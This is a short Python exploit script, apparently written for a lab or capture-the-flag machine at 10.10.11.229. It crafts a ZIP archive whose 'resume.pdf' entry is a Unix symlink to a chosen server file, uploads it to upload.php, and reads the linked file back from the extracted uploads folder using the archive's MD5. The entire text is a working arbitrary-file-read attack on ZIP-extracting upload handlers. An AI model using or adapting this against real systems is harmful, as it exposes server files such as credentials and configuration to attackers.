import requests
import stat
import hashlib
import io
import zipfile
import sys

def calculate_md5 (data) :
    md5_hash = hashlib.md5()
    md5_hash.update((data))
    return md5_hash.hexdigest()


def creat_zip (target_file ) :
    payload = io.BytesIO()
    zipInfo  = zipfile.ZipInfo("resume.pdf")
    zipInfo.create_system = 3 # System which created ZIP archive, 3 = Unix; 0 = Windows
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16 # The Python zipfile module accepts the 16-bit "Mode" field (that stores st_mode field from struct stat, containing user/group/other permissions, setuid/setgid and symlink info, etc) of the ASi extra block for Unix as bits 16-31 of the external_attr
    zipOut = zipfile.ZipFile(payload , 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, target_file)
    zipOut.close()
    return payload.getvalue()

def download_file (targetFile) : 
    url = "http://10.10.11.229/upload.php"
    payload = creat_zip(targetFile)
    files = {'zipFile': ( 'file.zip' ,payload )}
    data = {'submit': ''}
    md5 = calculate_md5(payload)
    requests.post(url, files=files, data=data)
    r = requests.get(f"http://10.10.11.229/uploads/{md5}/resume.pdf")
    return r.text


    